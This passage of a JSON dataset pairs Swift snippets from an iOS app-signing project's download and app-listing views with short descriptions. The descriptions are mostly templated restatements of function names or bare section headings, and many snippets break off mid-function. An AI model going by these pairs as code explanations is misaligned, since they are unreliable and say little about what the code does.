    "code": "private func verifyDownloadedFile(at url: URL) throws {\nlet fileData = try Data(contentsOf: url)\nlet checksum = CryptoHelper.shared.crc32(of: fileData)\nDebug.shared.log(message: \"Download completed with checksum: \\(checksum)\", type: .info)\n}\n\nprivate func processDownloadedBundle(\ncell: AppTableViewCell,\nanimationView: UIView,\ndownloadedURL: URL,",
    "nl": "Function verifyDownloadedFile - implements verifydownloadedfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3260",
    "code": "private func processDownloadedBundle(\ncell: AppTableViewCell,\nanimationView: UIView,\ndownloadedURL: URL,\nappUUID: String,\nsourceLocation: String\n) async {",
    "nl": "Function processDownloadedBundle - implements processdownloadedbundle functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3261",
    "code": "private func handleExtractionError(_ error: Error, cell: AppTableViewCell, appUUID: String) {\nDownloadTaskManager.shared.updateTask(uuid: appUUID, state: .failed(error: error))\nDebug.shared.log(message: \"Extraction error: \\(error.localizedDescription)\", type: .error)\n\nshowStatusAnimation(\nin: cell,\nsystemName: \"exclamationmark.circle\",\ntintColor: .systemRed\n)\n}",
    "nl": "Function handleExtractionError - implements handleextractionerror functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3262",
    "code": "private func processExtractedBundle(\ntargetBundle: String,\ncell: AppTableViewCell,\nappUUID: String,\nsourceLocation: String\n) {",
    "nl": "Function processExtractedBundle - implements processextractedbundle functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3263",
    "code": "private func handleImmediateInstallIfNeeded(appUUID: String) {\n// Check if immediate install is enabled\nif UserDefaults.standard.signingOptions.immediatelyInstallFromSource {",
    "nl": "Function handleImmediateInstallIfNeeded - implements handleimmediateinstallifneeded functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3264",
    "code": "private func handleDownloadError(\n_ error: Error,\ncell: AppTableViewCell,\nanimationView: UIView,\nappUUID: String,\ndownloadURL: URL\n) async {",
    "nl": "Function handleDownloadError - implements handledownloaderror functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3265",
    "code": "private func logDownloadError(_ error: Error, downloadURL: URL) {\n// Handle error logging based on error type\n// Note: Removed unnecessary cast since all Error objects can be treated as NSError\nlet nsError = error as NSError\nDebug.shared.log(\nmessage: \"Download error: \\(nsError.localizedDescription) (code: \\(nsError.code))\",\ntype: .error\n)\n\n// Add detailed error diagnostics",
    "nl": "Function logDownloadError - implements logdownloaderror functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3266",
    "code": "private func showStatusAnimation(\nin cell: AppTableViewCell,\nsystemName: String,\ntintColor: UIColor\n) {",
    "nl": "Function showStatusAnimation - implements showstatusanimation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "3267",
    "code": "protocol DownloadDelegate: AnyObject {\nfunc updateDownloadProgress(progress: Double, uuid: String)\nfunc stopDownload(uuid: String)\n}\n\n// This extension is moved to UIApplication+TopViewController.swift to avoid redeclaration\n",
    "nl": "protocol DownloadDelegate - implements functionality related to download delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift",
    "code_type": "protocol"
  },
  {
    "id": "3268",
    "code": "class AppTableViewCell: UITableViewCell {\n// MARK: - Properties\n\nvar appDownload: AppDownload?\nprivate var progressObserver: NSObjectProtocol?\n\nprivate let progressLayer = CAShapeLayer()\nprivate var getButtonWidthConstraint: NSLayoutConstraint?\nprivate var buttonImage: UIImage?\n",
    "nl": "MARK: - AppTableViewCell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "3269",
    "code": "private func setupViews() {\nlet labelsStackView = UIStackView(arrangedSubviews: [nameLabel, versionLabel])\nlabelsStackView.axis = .vertical\nlabelsStackView.spacing = 1\n\n// Add subviews\ncontentView.addSubview(iconImageView)\ncontentView.addSubview(labelsStackView)\ncontentView.addSubview(screenshotsScrollView)\nscreenshotsScrollView.addSubview(screenshotsStackView)",
    "nl": "MARK: - View Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3270",
    "code": "private func setupConstraints(labelsStackView: UIStackView) {\nNSLayoutConstraint.activate([\niconImageView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 15),\niconImageView.widthAnchor.constraint(equalToConstant: 52),\niconImageView.heightAnchor.constraint(equalToConstant: 52),\n\nlabelsStackView.leadingAnchor.constraint(equalTo: iconImageView.trailingAnchor, constant: 15),\nlabelsStackView.trailingAnchor.constraint(equalTo: getButton.leadingAnchor, constant: -15),\nlabelsStackView.centerYAnchor.constraint(equalTo: iconImageView.centerYAnchor),\nlabelsStackView.topAnchor.constraint(greaterThanOrEqualTo: contentView.topAnchor, constant: 15),",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3271",
    "code": "private func configureGetButtonArrow() {\nlet symbolConfig = UIImage.SymbolConfiguration(pointSize: 13, weight: .bold)\nbuttonImage = UIImage(systemName: \"arrow.down\", withConfiguration: symbolConfig)\ngetButton.setImage(buttonImage, for: .normal)\ngetButton.tintColor = .tintColor\n}\n\nprivate func configureGetButtonSquare() {",
    "nl": "MARK: - Button Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3272",
    "code": "private func configureGetButtonSquare() {\nlet symbolConfig = UIImage.SymbolConfiguration(pointSize: 9, weight: .bold)\nbuttonImage = UIImage(systemName: \"square.fill\", withConfiguration: symbolConfig)\ngetButton.setImage(buttonImage, for: .normal)\ngetButton.tintColor = .tintColor\n}\n\nprivate func configureProgressLayer() {",
    "nl": "Function configureGetButtonSquare - implements configuregetbuttonsquare functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3273",
    "code": "private func configureProgressLayer() {\nprogressLayer.strokeColor = UIColor.tintColor.cgColor\nprogressLayer.lineWidth = 3.0\nprogressLayer.fillColor = nil\nprogressLayer.lineCap = .round\nprogressLayer.strokeEnd = 0.0\n\nlet circularPath = UIBezierPath(roundedRect: getButton.bounds, cornerRadius: 15)\nprogressLayer.path = circularPath.cgPath\ngetButton.layer.addSublayer(progressLayer)",
    "nl": "Function configureProgressLayer - implements configureprogresslayer functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3274",
    "code": "private func addObservers() {\nprogressObserver = NotificationCenter.default.addObserver(\nforName: .downloadProgressUpdated,\nobject: nil,\nqueue: .main\n) { [weak self] notification in",
    "nl": "Function addObservers - implements addobservers functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3275",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\nupdateProgressLayerPath()\n}\n\noverride func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {",
    "nl": "MARK: - Lifecycle Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3276",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\ngetButton.layer.backgroundColor = UIColor.quaternarySystemFill.cgColor\nupdateProgressLayerPath()\n}\n\n// MARK: - Cell Configuration\n\nfunc configure(with app: StoreAppsData) {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3277",
    "code": "func configure(with app: StoreAppsData) {\n// Configure basic app info\nconfigureAppName(app)\nconfigureVersionText(app)\nconfigureAppIcon(app)\n\n// Remove any existing screenshots\nscreenshotsStackView.arrangedSubviews.forEach { $0.removeFromSuperview() }",
    "nl": "MARK: - Cell Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3278",
    "code": "private func configureAppName(_ app: StoreAppsData) {\nvar appname = app.name\nif app.bundleIdentifier.hasSuffix(\"Beta\") {",
    "nl": "Function configureAppName - implements configureappname functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3279",
    "code": "private func configureVersionText(_ app: StoreAppsData) {\nlet appVersion = (app.versions?.first?.version ?? app.version) ?? \"1.0\"\nvar displayText = appVersion\nvar descText = \"\"\n\n// Add date if available\ndisplayText = addDateToDisplayText(displayText, app: app)\n\n// Add subtitle/description based on preferences\n(displayText, descText) = addAppDescriptionInfo(displayText, app: app)",
    "nl": "Function configureVersionText - implements configureversiontext functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3280",
    "code": "private func addDateToDisplayText(_ displayText: String, app: StoreAppsData) -> String {\nvar result = displayText\nlet appDate = (app.versions?.first?.date ?? app.versionDate) ?? \"\"\n\nif !appDate.isEmpty {",
    "nl": "Function addDateToDisplayText - implements adddatetodisplaytext functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3281",
    "code": "private func addAppDescriptionInfo(_ displayText: String, app: StoreAppsData) -> (String, String) {\nvar resultDisplay = displayText\nvar descText = \"\"\n\nswitch Preferences.appDescriptionAppearence {",
    "nl": "Function addAppDescriptionInfo - implements addappdescriptioninfo functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3282",
    "code": "private func configureAppIcon(_ app: StoreAppsData) {\niconImageView.image = UIImage(named: \"unknown\")\n\nif let iconURL = app.iconURL {",
    "nl": "Function configureAppIcon - implements configureappicon functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3283",
    "code": "private func setupAppContentLayout(_ app: StoreAppsData) {\nif let screenshotUrls = app.screenshotURLs,\n!screenshotUrls.isEmpty,\nPreferences.appDescriptionAppearence != 2\n{",
    "nl": "Function setupAppContentLayout - sets upappcontentlayout",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3284",
    "code": "private func setupScreenshots(for urls: [URL]) {\nlet imageViews = createImageViewsForScreenshots(urls)\n\nscreenshotsScrollView.topAnchor.constraint(equalTo: iconImageView.bottomAnchor, constant: 10).isActive = true\nscreenshotsScrollView.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -15).isActive = true\niconImageView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 15).isActive = true\n\nfor imageView in imageViews {",
    "nl": "MARK: - Screenshots Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3285",
    "code": "private func createImageViewsForScreenshots(_ urls: [URL]) -> [UIImageView] {\nreturn urls.map { _ -> UIImageView in",
    "nl": "Function createImageViewsForScreenshots - creates imageviewsforscreenshots",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3286",
    "code": "private func setupDescription() {\niconImageView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 15).isActive = true\ndescriptionLabel.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -15).isActive = true\ndescriptionLabel.topAnchor.constraint(equalTo: iconImageView.bottomAnchor, constant: 15).isActive = true\n}\n\n@objc private func handleScreenshotTap(_ sender: UITapGestureRecognizer) {",
    "nl": "Function setupDescription - sets updescription",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3287",
    "code": "@objc private func handleScreenshotTap(_ sender: UITapGestureRecognizer) {\nguard let tappedImageView = sender.view as? UIImageView,\nlet tappedImage = tappedImageView.image\nelse {",
    "nl": "Function handleScreenshotTap - implements handlescreenshottap functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3288",
    "code": "private func loadImages(from urls: [URL], into imageViews: [UIImageView]) {\nlet dispatchGroup = DispatchGroup()\n\nfor (index, url) in urls.enumerated() {",
    "nl": "MARK: - Image Loading",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3289",
    "code": "private func loadImage(from url: URL, completion: @escaping (UIImage?) -> Void) {\nlet request = ImageRequest(url: url)\n\nif let cachedImage = ImagePipeline.shared.cache.cachedImage(for: request)?.image {",
    "nl": "Function loadImage - implements loadimage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3290",
    "code": "private func updateDownloadState(uuid: String?) {\nguard let appUUID = uuid else { return }",
    "nl": "MARK: - Download State",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3291",
    "code": "func updateProgress(to value: CGFloat) {\nDispatchQueue.main.async {",
    "nl": "Function updateProgress - updates progress",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3292",
    "code": "func startDownload() {\nDispatchQueue.main.async {",
    "nl": "Function startDownload - implements startdownload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3293",
    "code": "func stopDownload() {\nDispatchQueue.main.async {",
    "nl": "Function stopDownload - implements stopdownload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3294",
    "code": "func cancelDownload() {\nDispatchQueue.main.async {",
    "nl": "Function cancelDownload - implements canceldownload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3295",
    "code": "private func updateProgressLayerPath() {\nlet circularPath = UIBezierPath(roundedRect: getButton.bounds, cornerRadius: 15)\nprogressLayer.path = circularPath.cgPath\n}\n}\n\n// MARK: - Factory for UI Elements\n\nprivate enum AppCellFactory {",
    "nl": "Function updateProgressLayerPath - updates progresslayerpath",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3296",
    "code": "private enum AppCellFactory {\nstatic func createIconImageView() -> UIImageView {",
    "nl": "MARK: - Factory for UI Elements",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "enum"
  },
  {
    "id": "3297",
    "code": "static func createIconImageView() -> UIImageView {\nlet imageView = UIImageView()\nimageView.contentMode = .scaleAspectFill\nimageView.clipsToBounds = true\nimageView.layer.cornerRadius = 12\nimageView.layer.cornerCurve = .continuous\nimageView.layer.borderWidth = 1\nimageView.layer.borderColor = UIColor.lightGray.withAlphaComponent(0.3).cgColor\nimageView.translatesAutoresizingMaskIntoConstraints = false\nreturn imageView",
    "nl": "Function createIconImageView - creates iconimageview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3298",
    "code": "static func createNameLabel() -> UILabel {\nlet label = UILabel()\nlabel.font = .boldSystemFont(ofSize: 16)\nlabel.numberOfLines = 1\nlabel.translatesAutoresizingMaskIntoConstraints = false\nreturn label\n}\n\nstatic func createVersionLabel() -> UILabel {",
    "nl": "Function createNameLabel - creates namelabel",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3299",
    "code": "static func createVersionLabel() -> UILabel {\nlet label = UILabel()\nlabel.font = .systemFont(ofSize: 13, weight: .regular)\nlabel.textColor = .gray\nlabel.numberOfLines = 2\nlabel.translatesAutoresizingMaskIntoConstraints = false\nreturn label\n}\n\nstatic func createDescriptionLabel() -> UILabel {",
    "nl": "Function createVersionLabel - creates versionlabel",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3300",
    "code": "static func createDescriptionLabel() -> UILabel {\nlet label = UILabel()\nlabel.font = .systemFont(ofSize: 13, weight: .regular)\nlabel.textColor = .gray\nlabel.numberOfLines = 20\nlabel.translatesAutoresizingMaskIntoConstraints = false\nreturn label\n}\n\nstatic func createScreenshotsScrollView() -> UIScrollView {",
    "nl": "Function createDescriptionLabel - creates descriptionlabel",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3301",
    "code": "static func createScreenshotsScrollView() -> UIScrollView {\nlet scrollView = UIScrollView()\nscrollView.contentInset = UIEdgeInsets(top: 0, left: 15, bottom: 0, right: 15)\nscrollView.showsHorizontalScrollIndicator = false\nscrollView.translatesAutoresizingMaskIntoConstraints = false\nreturn scrollView\n}\n\nstatic func createScreenshotsStackView() -> UIStackView {",
    "nl": "Function createScreenshotsScrollView - creates screenshotsscrollview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3302",
    "code": "static func createScreenshotsStackView() -> UIStackView {\nlet stackView = UIStackView()\nstackView.axis = .horizontal\nstackView.spacing = 10\nstackView.alignment = .center\nstackView.translatesAutoresizingMaskIntoConstraints = false\nreturn stackView\n}\n}\n",
    "nl": "Function createScreenshotsStackView - creates screenshotsstackview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3303",
    "code": "class SourceAppScreenshotViewController: UIViewController {\n// MARK: - Properties\n\nvar image: UIImage?\n\n// MARK: - UI Components\n\nprivate let imageView: UIImageView = {",
    "nl": "MARK: - SourceAppScreenshotViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "3304",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupView()\n}\n\noverride func viewDidLayoutSubviews() {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3305",
    "code": "override func viewDidLayoutSubviews() {\nsuper.viewDidLayoutSubviews()\nupdateImageViewSize()\n}\n\n// MARK: - Setup\n\nprivate func setupView() {",
    "nl": "Function viewDidLayoutSubviews - implements viewdidlayoutsubviews functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3306",
    "code": "private func setupView() {\nview.backgroundColor = .systemBackground\nview.addSubview(imageView)\nsetupConstraints()\nimageView.image = image\n\nnavigationItem.rightBarButtonItem = UIBarButtonItem(\ntitle: String.localized(\"DONE\"),\nstyle: .done,\ntarget: self,",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3307",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\nimageView.centerXAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerXAnchor),\nimageView.centerYAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerYAnchor),\nimageView.widthAnchor.constraint(lessThanOrEqualTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.9),\nimageView.heightAnchor.constraint(\nlessThanOrEqualTo: view.safeAreaLayoutGuide.heightAnchor,\nmultiplier: 0.9\n),\n])",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3308",
    "code": "private func updateImageViewSize() {\nguard let image = image else { return }",
    "nl": "Function updateImageViewSize - updates imageviewsize",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3309",
    "code": "@objc func closeSheet() {\ndismiss(animated: true)\n}\n}\n",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3310",
    "code": "enum SortOption: String, Codable {\ncase `default`\ncase name\ncase date\n}\n\n// MARK: - SourceAppViewController\n\nclass SourceAppViewController: UITableViewController {",
    "nl": "MARK: - SortOption",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "3311",
    "code": "class SourceAppViewController: UITableViewController {\n// MARK: - Properties\n\nvar newsData: [NewsData] = []\nvar apps: [StoreAppsData] = []\nvar oApps: [StoreAppsData] = []\nvar filteredApps: [StoreAppsData] = []\n\nvar name: String? { didSet { title = name } }",
    "nl": "MARK: - SourceAppViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3312",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupNavigation()\nsetupSearchController()\nsetupViews()\nloadAppsData()\n}\n\n// MARK: - Setup Methods\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3313",
    "code": "fileprivate func setupViews() {\ntableView.dataSource = self\ntableView.delegate = self\ntableView.tableHeaderView = UIView()\ntableView.register(AppTableViewCell.self, forCellReuseIdentifier: \"AppTableViewCell\")\nnavigationItem.titleView = activityIndicator\nactivityIndicator.startAnimating()\n}\n\nprivate func setupHeader() {",
    "nl": "MARK: - Setup Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3314",
    "code": "private func setupHeader() {\nguard uri.count == 1, !newsData.isEmpty else { return }",
    "nl": "Function setupHeader - sets upheader",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3315",
    "code": "fileprivate func setupNavigation() {\nnavigationItem.largeTitleDisplayMode = .never\n}\n\n// MARK: - Filter Menu\n\nprivate func updateFilterMenu() {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3316",
    "code": "private func updateFilterMenu() {\nlet filterMenu = UIMenu(\ntitle: String.localized(\"SOURCES_CELLS_ACTIONS_FILTER_TITLE\"),\nchildren: createSubSortMenu()\n)\nlet filterButton = UIBarButtonItem(\nimage: UIImage(systemName: \"line.3.horizontal.decrease\"),\nmenu: filterMenu\n)\n",
    "nl": "MARK: - Filter Menu",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3317",
    "code": "private func createSubSortMenu() -> [UIMenuElement] {\nlet sortByDAction = createSortAction(\ntitle: String.localized(\"SOURCES_CELLS_ACTIONS_FILTER_BY_DEFAULT\"),\nsortOption: .default\n)\nlet sortByNameAction = createSortAction(\ntitle: String.localized(\"SOURCES_CELLS_ACTIONS_FILTER_BY_NAME\"),\nsortOption: .name\n)\nlet sortBySizeAction = createSortAction(",
    "nl": "Function createSubSortMenu - creates subsortmenu",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3318",
